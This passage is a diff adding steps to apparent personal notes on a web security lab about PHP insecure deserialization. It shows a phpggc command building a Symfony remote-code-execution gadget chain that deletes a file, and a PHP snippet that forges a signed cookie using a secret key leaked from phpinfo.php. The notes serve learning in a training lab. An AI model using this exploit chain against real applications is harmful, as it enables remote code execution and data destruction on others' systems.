@@ -71,3 +71,17 @@ If you have source code access, you should start by looking for unserialize() an
             cd phpggc
              ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
       4. Copy the token and go to laburl/cgi-bin/phpinfo.php and collect secret from there
+      5. Craft a payload :
+                    <?php
+                    $object = "OBJECT-GENERATED-BY-PHPGGC";
+                    $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+                    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+                    echo $cookie;
+
+        then run this in wsl by php file.php   
+      6. Copy the o/p of file.php and paste it in place of cookie and send the request and lab is solved.
+
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+#7 Lab: exp
